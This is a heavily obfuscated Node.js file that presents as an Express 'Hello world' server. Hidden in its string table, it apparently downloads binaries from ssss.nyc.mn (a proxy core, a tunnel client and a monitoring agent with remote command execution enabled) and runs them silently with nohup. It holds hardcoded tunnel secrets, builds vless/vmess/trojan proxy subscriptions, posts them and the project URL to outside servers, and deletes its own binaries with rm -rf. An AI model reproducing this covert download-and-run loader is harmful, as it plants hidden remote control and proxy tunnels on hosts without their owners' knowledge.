const _0x434c32=_0x39cc;function _0x6f28(){const _0x1a78d0=['stringify','NAME','block','11BOkMbK','bot','http\x20server\x20is\x20running\x20on\x20port:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','bot\x20is\x20running','Download\x20','data','trim','FILE_PATH','http','log','1818160NjTcpT','/vmess-ergou','/api/delete-nodes','?encryption=none&security=tls&sni=','clear','child_process','web','/sub.txt\x20saved\x20successfully','from','ERGOU_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','utf-8','UUID','Subscription\x20uploaded\x20successfully','push','npm\x20is\x20running','filter','includes','length','N_SERVER','?security=tls&sni=','554600gUIrvU','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/vless-ergou','&type=ws&host=','writeFileSync','vmess','boot.log','TunnelSecret','1624668WEpaEh','stream','1051212UFpYRJ','forEach','添加URL失败:\x20','https://arm64.ssss.nyc.mn/web','Galaxycloud-US','8443','Skipping\x20adding\x20automatic\x20access\x20task','quic','aarch64','678824WctsUp','https://arm64.ssss.nyc.mn/2go','3609ef9e-7dcd-480d-bc2d-3a5c142db681','php','get','WEey0BIpB0tJc9z3by','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','match','pop','unlinkSync','ERGOU_DOMAIN\x20or\x20ERGOU_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','join','/api/add-subscriptions','28BYOKFB','error','\x0aclient_secret:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','post','\x20>/dev/null\x202>&1\x20&','web\x20is\x20running','\x0a\x20\x20tunnel:\x20','./web','freedom','axios','arm','unshift','has','toString','ERGOU_DOMAIN','sub.txt','/dev/null','fileUrl','config.json','nohup\x20','tls','/php\x20-c\x20\x22','trojan','existsSync','vless','2087','state','/tunnel.yml\x20run','\x0a\x20\x20credentials-file:\x20','tunnel.json','text/plain;\x20charset=utf-8','fileName','/config.json\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','none','bot\x20is\x20running.','2053','\x0a\x20\x20\x0avmess://','ip.sb','unlink','5092815xxpWgw','https://amd64.ssss.nyc.mn/web','base64','--tls','Empowerment\x20failed\x20for\x20','App\x20is\x20running','./npm','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','N_PORT','env','\x20--tls\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','rm\x20-rf\x20','false','./bot','readFileSync','\x20failed:\x20','&path=%2Ftrojan-ergou%3Fed%3D2560#','finish','&path=%2Fvless-ergou%3Fed%3D2560#','SERVER_PORT','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','N_KEY','test','{\x22AccountTag\x22:\x22854053d711712e9d3f717b21d1459630\x22,\x22TunnelSecret\x22:\x222XJCC5aCyn1uIxm2bKanYwhvPYyLWsTeED5dyeiyl7I=\x22,\x22TunnelID\x22:\x22fd466f50-e742-4921-bb34-8b064ebe409f\x22,\x22Endpoint\x22:\x22\x22}','https://amd64.ssss.nyc.mn/agent','2096','PORT','send','application/json','pipe','https://oooo.serv00.net/add-url','map','npm','106TTsbHB','PROJECT_URL','status','Error\x20executing\x20command:\x20','split','\x20>/dev/null\x202>&1','13977MIaSHN','express','443','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/npm\x20-s\x20','ErgouDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ErgouDomain','catch','2083','amd','message','createWriteStream','chmod','idx-4.333333.pp.ua','npm\x20running\x20error:\x20','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','CFIP','/vmess-ergou?ed=2560','ERGOU_DOMAIN:','./sta','Content-Type','Error\x20downloading\x20files:','listen','54esFgbl','https://amd64.ssss.nyc.mn/2go','ERGOU_PORT','close','\x0avless://'];_0x6f28=function(){return _0x1a78d0;};return _0x6f28();}(function(_0x240364,_0x4ca93d){const _0x397e2c=_0x39cc,_0x59a58c=_0x240364();while(!![]){try{const _0x456082=-parseInt(_0x397e2c(0x183))/0x1+-parseInt(_0x397e2c(0x133))/0x2*(-parseInt(_0x397e2c(0x139))/0x3)+parseInt(_0x397e2c(0x18c))/0x4+parseInt(_0x397e2c(0x1c2))/0x5+-parseInt(_0x397e2c(0x181))/0x6*(-parseInt(_0x397e2c(0x199))/0x7)+parseInt(_0x397e2c(0x179))/0x8*(-parseInt(_0x397e2c(0x150))/0x9)+parseInt(_0x397e2c(0x165))/0xa*(-parseInt(_0x397e2c(0x158))/0xb);if(_0x456082===_0x4ca93d)break;else _0x59a58c['push'](_0x59a58c['shift']());}catch(_0x31a699){_0x59a58c['push'](_0x59a58c['shift']());}}}(_0x6f28,0xd43d2));const express=require(_0x434c32(0x13a)),app=express(),axios=require(_0x434c32(0x1a3)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x434c32(0x16a))['exec']),{execSync}=require(_0x434c32(0x16a)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x434c32(0x134)]||'',AUTO_ACCESS=process[_0x434c32(0x1ce)][_0x434c32(0x1d0)]||![],FILE_PATH=process[_0x434c32(0x1ce)][_0x434c32(0x162)]||_0x434c32(0x14c),SUB_PATH=process['env']['SUB_PATH']||_0x434c32(0x1b4),PORT=process[_0x434c32(0x1ce)][_0x434c32(0x1d9)]||process['env'][_0x434c32(0x1e0)]||0xbb8,UUID=process[_0x434c32(0x1ce)][_0x434c32(0x170)]||_0x434c32(0x18e),N_SERVER=process['env'][_0x434c32(0x177)]||'tz.234.pp.ua',N_PORT=process[_0x434c32(0x1ce)][_0x434c32(0x1cd)]||'443',N_KEY=process[_0x434c32(0x1ce)][_0x434c32(0x1db)]||_0x434c32(0x191),ERGOU_DOMAIN=process['env'][_0x434c32(0x1a8)]||_0x434c32(0x146),ERGOU_AUTH=process[_0x434c32(0x1ce)]['ERGOU_AUTH']||_0x434c32(0x1dd),ERGOU_PORT=process['env'][_0x434c32(0x152)]||0x1f41,CFIP=process[_0x434c32(0x1ce)][_0x434c32(0x149)]||_0x434c32(0x1c0),CFPORT=process[_0x434c32(0x1ce)]['CFPORT']||0x1bb,NAME=process[_0x434c32(0x1ce)][_0x434c32(0x156)]||_0x434c32(0x187);!fs[_0x434c32(0x1b1)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x434c32(0x164)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x434c32(0x1bb));let npmPath=path['join'](FILE_PATH,_0x434c32(0x1e6)),phpPath=path[_0x434c32(0x197)](FILE_PATH,_0x434c32(0x18f)),webPath=path['join'](FILE_PATH,_0x434c32(0x16b)),botPath=path[_0x434c32(0x197)](FILE_PATH,'bot'),subPath=path['join'](FILE_PATH,_0x434c32(0x1a9)),listPath=path[_0x434c32(0x197)](FILE_PATH,'list.txt'),bootLogPath=path[_0x434c32(0x197)](FILE_PATH,_0x434c32(0x17f)),configPath=path[_0x434c32(0x197)](FILE_PATH,_0x434c32(0x1ac));function deleteNodes(){const _0x203382=_0x434c32;try{if(!UPLOAD_URL)return;if(!fs[_0x203382(0x1b1)](subPath))return;let _0x2da2fa;try{_0x2da2fa=fs[_0x203382(0x1d4)](subPath,_0x203382(0x16f));}catch{return null;}const _0x3f6d3c=Buffer[_0x203382(0x16d)](_0x2da2fa,_0x203382(0x1c4))[_0x203382(0x1a7)]('utf-8'),_0x5ed01a=_0x3f6d3c[_0x203382(0x137)]('\x0a')['filter'](_0xb6a2b9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xb6a2b9));if(_0x5ed01a['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x203382(0x167),JSON[_0x203382(0x155)]({'nodes':_0x5ed01a}),{'headers':{'Content-Type':'application/json'}})[_0x203382(0x140)](_0x42d269=>{return null;});}catch(_0xe83950){return null;}}function cleanupOldFiles(){const _0x14809d=_0x434c32,_0x514385=[_0x14809d(0x16b),_0x14809d(0x159),'npm','php',_0x14809d(0x1a9),_0x14809d(0x17f)];_0x514385[_0x14809d(0x184)](_0x58deb6=>{const _0x25c934=path['join'](FILE_PATH,_0x58deb6);fs['unlink'](_0x25c934,()=>{});});}app['get']('/',function(_0x5095a6,_0x222a39){const _0x5e60b3=_0x434c32;_0x222a39[_0x5e60b3(0x1e1)]('Hello\x20world!');});const config={'log':{'access':_0x434c32(0x1aa),'error':'/dev/null','loglevel':_0x434c32(0x1bc)},'inbounds':[{'port':ERGOU_PORT,'protocol':_0x434c32(0x1b2),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x434c32(0x17b),'dest':0xbba},{'path':_0x434c32(0x166),'dest':0xbbb},{'path':'/trojan-ergou','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x434c32(0x1bc)},'streamSettings':{'network':'tcp','security':_0x434c32(0x1bc)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x434c32(0x1bc)},'streamSettings':{'network':'ws','security':_0x434c32(0x1bc),'wsSettings':{'path':_0x434c32(0x17b)}},'sniffing':{'enabled':!![],'destOverride':[_0x434c32(0x163),_0x434c32(0x1ae),_0x434c32(0x18a)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x434c32(0x17e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x434c32(0x166)}},'sniffing':{'enabled':!![],'destOverride':[_0x434c32(0x163),_0x434c32(0x1ae),_0x434c32(0x18a)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x434c32(0x1b0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-ergou'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x434c32(0x18a)],'metadataOnly':![]}}],'dns':{'servers':[_0x434c32(0x1c9)]},'outbounds':[{'protocol':_0x434c32(0x1a2),'tag':'direct'},{'protocol':'blackhole','tag':_0x434c32(0x157)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x434c32(0x1ac)),JSON[_0x434c32(0x155)](config,null,0x2));function getSystemArchitecture(){const _0x3576a8=_0x434c32,_0xe97a58=os['arch']();return _0xe97a58===_0x3576a8(0x1a4)||_0xe97a58==='arm64'||_0xe97a58===_0x3576a8(0x18b)?'arm':_0x3576a8(0x142);}function downloadFile(_0x2bbd7b,_0x403c67,_0x4126b6){const _0x48a87c=_0x434c32,_0xdc9874=path['join'](FILE_PATH,_0x2bbd7b),_0x254a4c=fs[_0x48a87c(0x144)](_0xdc9874);axios({'method':_0x48a87c(0x190),'url':_0x403c67,'responseType':_0x48a87c(0x182)})['then'](_0x2e0a26=>{const _0x2a9f79=_0x48a87c;_0x2e0a26[_0x2a9f79(0x160)][_0x2a9f79(0x1e3)](_0x254a4c),_0x254a4c['on'](_0x2a9f79(0x1d7),()=>{const _0x13599e=_0x2a9f79;_0x254a4c[_0x13599e(0x153)](),console[_0x13599e(0x164)](_0x13599e(0x15f)+_0x2bbd7b+'\x20successfully'),_0x4126b6(null,_0x2bbd7b);}),_0x254a4c['on']('error',_0x642adb=>{const _0x1a9321=_0x2a9f79;fs[_0x1a9321(0x1c1)](_0xdc9874,()=>{});const _0x15127a='Download\x20'+_0x2bbd7b+_0x1a9321(0x1d5)+_0x642adb[_0x1a9321(0x143)];console['error'](_0x15127a),_0x4126b6(_0x15127a);});})['catch'](_0x534c0c=>{const _0x39a3c5=_0x48a87c,_0x2c63b1=_0x39a3c5(0x15f)+_0x2bbd7b+'\x20failed:\x20'+_0x534c0c[_0x39a3c5(0x143)];console[_0x39a3c5(0x19a)](_0x2c63b1),_0x4126b6(_0x2c63b1);});}function _0x39cc(_0x34a44d,_0x5cfea4){const _0x6f2891=_0x6f28();return _0x39cc=function(_0x39cc73,_0x178c95){_0x39cc73=_0x39cc73-0x133;let _0x1de6c6=_0x6f2891[_0x39cc73];return _0x1de6c6;},_0x39cc(_0x34a44d,_0x5cfea4);}async function downloadFilesAndRun(){const _0x13331a=_0x434c32,_0x53290a=getSystemArchitecture(),_0x1746e1=getFilesForArchitecture(_0x53290a);if(_0x1746e1[_0x13331a(0x176)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3ba37f=_0x1746e1[_0x13331a(0x1e5)](_0xf04046=>{return new Promise((_0xf4c2bd,_0x48c14d)=>{const _0x306eaa=_0x39cc;downloadFile(_0xf04046[_0x306eaa(0x1b9)],_0xf04046[_0x306eaa(0x1ab)],(_0x48c469,_0x81fbbe)=>{_0x48c469?_0x48c14d(_0x48c469):_0xf4c2bd(_0x81fbbe);});});});try{await Promise['all'](_0x3ba37f);}catch(_0x41e6f6){console[_0x13331a(0x19a)](_0x13331a(0x14e),_0x41e6f6);return;}function _0x50556a(_0x25c15b){const _0x354ab9=_0x13331a,_0x182313=0x1fd;_0x25c15b[_0x354ab9(0x184)](_0x41eb60=>{const _0x1fd95b=_0x354ab9,_0x54d3c0=path[_0x1fd95b(0x197)](FILE_PATH,_0x41eb60);fs[_0x1fd95b(0x1b1)](_0x54d3c0)&&fs[_0x1fd95b(0x145)](_0x54d3c0,_0x182313,_0xb8130c=>{const _0x988c76=_0x1fd95b;_0xb8130c?console[_0x988c76(0x19a)](_0x988c76(0x1c6)+_0x54d3c0+':\x20'+_0xb8130c):console['log']('Empowerment\x20success\x20for\x20'+_0x54d3c0+':\x20'+_0x182313[_0x988c76(0x1a7)](0x8));});});}const _0x896e62=N_PORT?[_0x13331a(0x1c8),_0x13331a(0x1a1),_0x13331a(0x1d3)]:['./php',_0x13331a(0x1a1),_0x13331a(0x1d3)];_0x50556a(_0x896e62);if(N_SERVER&&N_KEY){if(!N_PORT){const _0x160280=N_SERVER[_0x13331a(0x175)](':')?N_SERVER[_0x13331a(0x137)](':')[_0x13331a(0x194)]():'',_0x55123c=new Set([_0x13331a(0x13b),'8443','2096','2087',_0x13331a(0x141),_0x13331a(0x1be)]),_0x3f6142=_0x55123c[_0x13331a(0x1a6)](_0x160280)?'true':_0x13331a(0x1d2),_0x2b82e5=_0x13331a(0x19b)+N_KEY+_0x13331a(0x1cc)+N_SERVER+_0x13331a(0x148)+_0x3f6142+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x13331a(0x17d)](path[_0x13331a(0x197)](FILE_PATH,'config.yaml'),_0x2b82e5);const _0x3f425d='nohup\x20'+FILE_PATH+_0x13331a(0x1af)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3f425d),console['log']('php\x20is\x20running'),await new Promise(_0xdb8f59=>setTimeout(_0xdb8f59,0x3e8));}catch(_0x24c051){console[_0x13331a(0x19a)](_0x13331a(0x13c)+_0x24c051);}}else{let _0xfc62eb='';const _0xfd7eb2=[_0x13331a(0x13b),_0x13331a(0x188),_0x13331a(0x1df),_0x13331a(0x1b3),_0x13331a(0x141),_0x13331a(0x1be)];_0xfd7eb2[_0x13331a(0x175)](N_PORT)&&(_0xfc62eb=_0x13331a(0x1c5));const _0x5e60db=_0x13331a(0x1ad)+FILE_PATH+_0x13331a(0x13e)+N_SERVER+':'+N_PORT+'\x20-p\x20'+N_KEY+'\x20'+_0xfc62eb+_0x13331a(0x1cf);try{await exec(_0x5e60db),console[_0x13331a(0x164)](_0x13331a(0x173)),await new Promise(_0x5281e8=>setTimeout(_0x5281e8,0x3e8));}catch(_0x92c335){console[_0x13331a(0x19a)](_0x13331a(0x147)+_0x92c335);}}}else console[_0x13331a(0x164)]('N\x20variable\x20is\x20empty,skip\x20running');const _0x2a4937=_0x13331a(0x1ad)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x13331a(0x1ba);try{await exec(_0x2a4937),console[_0x13331a(0x164)](_0x13331a(0x19f)),await new Promise(_0x4a5488=>setTimeout(_0x4a5488,0x3e8));}catch(_0x434ef2){console[_0x13331a(0x19a)]('web\x20running\x20error:\x20'+_0x434ef2);}if(fs[_0x13331a(0x1b1)](path['join'](FILE_PATH,_0x13331a(0x159)))){let _0x51d986;if(ERGOU_AUTH[_0x13331a(0x193)](/^[A-Z0-9a-z=]{120,250}$/))_0x51d986=_0x13331a(0x1cb)+ERGOU_AUTH;else ERGOU_AUTH[_0x13331a(0x193)](/TunnelSecret/)?_0x51d986=_0x13331a(0x15c)+FILE_PATH+_0x13331a(0x1b5):_0x51d986=_0x13331a(0x15b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ERGOU_PORT;try{await exec('nohup\x20'+FILE_PATH+'/bot\x20'+_0x51d986+'\x20>/dev/null\x202>&1\x20&'),console['log'](_0x13331a(0x15e)),await new Promise(_0x53eba7=>setTimeout(_0x53eba7,0x7d0));}catch(_0x206d00){console['error'](_0x13331a(0x136)+_0x206d00);}}await new Promise(_0x44ba7a=>setTimeout(_0x44ba7a,0x1388));}function getFilesForArchitecture(_0x2532fa){const _0x111368=_0x434c32;let _0x559fb8;_0x2532fa==='arm'?_0x559fb8=[{'fileName':'web','fileUrl':_0x111368(0x186)},{'fileName':_0x111368(0x159),'fileUrl':_0x111368(0x18d)}]:_0x559fb8=[{'fileName':_0x111368(0x16b),'fileUrl':_0x111368(0x1c3)},{'fileName':_0x111368(0x159),'fileUrl':_0x111368(0x151)}];if(N_SERVER&&N_KEY){if(N_PORT){const _0x42147d=_0x2532fa===_0x111368(0x1a4)?'https://arm64.ssss.nyc.mn/agent':_0x111368(0x1de);_0x559fb8[_0x111368(0x1a5)]({'fileName':'npm','fileUrl':_0x42147d});}else{const _0x1b07f7=_0x2532fa===_0x111368(0x1a4)?'https://arm64.ssss.nyc.mn/v1':_0x111368(0x1ca);_0x559fb8[_0x111368(0x1a5)]({'fileName':_0x111368(0x18f),'fileUrl':_0x1b07f7});}}return _0x559fb8;}function ergouType(){const _0x422291=_0x434c32;if(!ERGOU_AUTH||!ERGOU_DOMAIN){console[_0x422291(0x164)](_0x422291(0x196));return;}if(ERGOU_AUTH[_0x422291(0x175)](_0x422291(0x180))){fs[_0x422291(0x17d)](path[_0x422291(0x197)](FILE_PATH,_0x422291(0x1b7)),ERGOU_AUTH);const _0x513c66=_0x422291(0x1a0)+ERGOU_AUTH[_0x422291(0x137)]('\x22')[0xb]+_0x422291(0x1b6)+path[_0x422291(0x197)](FILE_PATH,_0x422291(0x1b7))+_0x422291(0x192)+ERGOU_DOMAIN+_0x422291(0x13d)+ERGOU_PORT+_0x422291(0x17a);fs[_0x422291(0x17d)](path[_0x422291(0x197)](FILE_PATH,'tunnel.yml'),_0x513c66);}else console[_0x422291(0x164)](_0x422291(0x16e));}ergouType();async function extractDomains(){const _0x53e354=_0x434c32;let _0x14ad3e;if(ERGOU_AUTH&&ERGOU_DOMAIN)_0x14ad3e=ERGOU_DOMAIN,console[_0x53e354(0x164)](_0x53e354(0x14b),_0x14ad3e),await _0x230a70(_0x14ad3e);else try{const _0x29f386=fs[_0x53e354(0x1d4)](path[_0x53e354(0x197)](FILE_PATH,_0x53e354(0x17f)),_0x53e354(0x16f)),_0x526330=_0x29f386[_0x53e354(0x137)]('\x0a'),_0x568d40=[];_0x526330[_0x53e354(0x184)](_0x46bc3d=>{const _0x265a1f=_0x53e354,_0x1225a5=_0x46bc3d[_0x265a1f(0x193)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1225a5){const _0x2e03b8=_0x1225a5[0x1];_0x568d40['push'](_0x2e03b8);}});if(_0x568d40[_0x53e354(0x176)]>0x0)_0x14ad3e=_0x568d40[0x0],console[_0x53e354(0x164)]('ErgouDomain:',_0x14ad3e),await _0x230a70(_0x14ad3e);else{console[_0x53e354(0x164)](_0x53e354(0x13f)),fs[_0x53e354(0x195)](path[_0x53e354(0x197)](FILE_PATH,_0x53e354(0x17f)));async function _0x56b1dc(){const _0x5d876c=_0x53e354;try{await exec(_0x5d876c(0x15d));}catch(_0x3fc8f7){}}_0x56b1dc(),await new Promise(_0x98d352=>setTimeout(_0x98d352,0xbb8));const _0x43ffdf='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x53e354(0x19c)+ERGOU_PORT;try{await exec(_0x53e354(0x1ad)+path[_0x53e354(0x197)](FILE_PATH,_0x53e354(0x159))+'\x20'+_0x43ffdf+_0x53e354(0x19e)),console[_0x53e354(0x164)](_0x53e354(0x1bd)),await new Promise(_0x241e9e=>setTimeout(_0x241e9e,0xbb8)),await extractDomains();}catch(_0x97b246){console[_0x53e354(0x19a)](_0x53e354(0x136)+_0x97b246);}}}catch(_0x4d527c){console[_0x53e354(0x19a)]('Error\x20reading\x20boot.log:',_0x4d527c);}async function _0x230a70(_0x7adedd){const _0x1e9cf1=_0x53e354,_0x40c83d=execSync(_0x1e9cf1(0x1da),{'encoding':_0x1e9cf1(0x16f)}),_0x2edc81=_0x40c83d[_0x1e9cf1(0x161)]();return new Promise(_0x53e82b=>{setTimeout(()=>{const _0x4c88f6=_0x39cc,_0xe23f16={'v':'2','ps':NAME+'-'+_0x2edc81,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x7adedd,'path':_0x4c88f6(0x14a),'tls':_0x4c88f6(0x1ae),'sni':_0x7adedd,'alpn':''},_0x91deb4=_0x4c88f6(0x154)+UUID+'@'+CFIP+':'+CFPORT+_0x4c88f6(0x168)+_0x7adedd+_0x4c88f6(0x17c)+_0x7adedd+_0x4c88f6(0x1d8)+NAME+'-'+_0x2edc81+_0x4c88f6(0x1bf)+Buffer[_0x4c88f6(0x16d)](JSON[_0x4c88f6(0x155)](_0xe23f16))[_0x4c88f6(0x1a7)](_0x4c88f6(0x1c4))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4c88f6(0x178)+_0x7adedd+_0x4c88f6(0x17c)+_0x7adedd+_0x4c88f6(0x1d6)+NAME+'-'+_0x2edc81+'\x0a\x20\x20\x20\x20';console[_0x4c88f6(0x164)](Buffer[_0x4c88f6(0x16d)](_0x91deb4)[_0x4c88f6(0x1a7)](_0x4c88f6(0x1c4))),fs['writeFileSync'](subPath,Buffer[_0x4c88f6(0x16d)](_0x91deb4)['toString'](_0x4c88f6(0x1c4))),console['log'](FILE_PATH+_0x4c88f6(0x16c)),uplodNodes(),app[_0x4c88f6(0x190)]('/'+SUB_PATH,(_0x3297d4,_0x12239a)=>{const _0x46751c=_0x4c88f6,_0x552e64=Buffer[_0x46751c(0x16d)](_0x91deb4)[_0x46751c(0x1a7)]('base64');_0x12239a['set'](_0x46751c(0x14d),_0x46751c(0x1b8)),_0x12239a['send'](_0x552e64);}),_0x53e82b(_0x91deb4);},0x7d0);});}}async function uplodNodes(){const _0xb81b1e=_0x434c32;if(UPLOAD_URL&&PROJECT_URL){const _0x574d0f=PROJECT_URL+'/'+SUB_PATH,_0x26d1cb={'subscription':[_0x574d0f]};try{const _0x2e04fd=await axios[_0xb81b1e(0x19d)](UPLOAD_URL+_0xb81b1e(0x198),_0x26d1cb,{'headers':{'Content-Type':_0xb81b1e(0x1e2)}});if(_0x2e04fd[_0xb81b1e(0x135)]===0xc8)console[_0xb81b1e(0x164)](_0xb81b1e(0x171));else return null;}catch(_0x4dd74a){if(_0x4dd74a['response']){if(_0x4dd74a['response'][_0xb81b1e(0x135)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xb81b1e(0x1b1)](listPath))return;const _0x66cf60=fs[_0xb81b1e(0x1d4)](listPath,_0xb81b1e(0x16f)),_0x429ae5=_0x66cf60[_0xb81b1e(0x137)]('\x0a')[_0xb81b1e(0x174)](_0x1d92c1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xb81b1e(0x1dc)](_0x1d92c1));if(_0x429ae5[_0xb81b1e(0x176)]===0x0)return;const _0x2138f6=JSON[_0xb81b1e(0x155)]({'nodes':_0x429ae5});try{await axios[_0xb81b1e(0x19d)](UPLOAD_URL+'/api/add-nodes',_0x2138f6,{'headers':{'Content-Type':_0xb81b1e(0x1e2)}});if(response[_0xb81b1e(0x135)]===0xc8)console['log'](_0xb81b1e(0x171));else return null;}catch(_0x4d72f0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x24e067=_0x39cc,_0x4bab57=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(N_PORT)_0x4bab57[_0x24e067(0x172)](npmPath);else N_SERVER&&N_KEY&&_0x4bab57['push'](phpPath);exec(_0x24e067(0x1d1)+_0x4bab57[_0x24e067(0x197)]('\x20')+_0x24e067(0x138),_0x33a352=>{const _0xf5bc10=_0x24e067;console[_0xf5bc10(0x169)](),console[_0xf5bc10(0x164)](_0xf5bc10(0x1c7)),console[_0xf5bc10(0x164)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1081ba=_0x434c32;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1081ba(0x164)](_0x1081ba(0x189));return;}try{const _0x48133a=await axios[_0x1081ba(0x19d)](_0x1081ba(0x1e4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1081ba(0x1e2)}});console['log']('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x4ce76f){console[_0x1081ba(0x19a)](_0x1081ba(0x185)+_0x4ce76f[_0x1081ba(0x143)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x434c32(0x14f)](PORT,()=>console[_0x434c32(0x164)](_0x434c32(0x15a)+PORT+'!'));
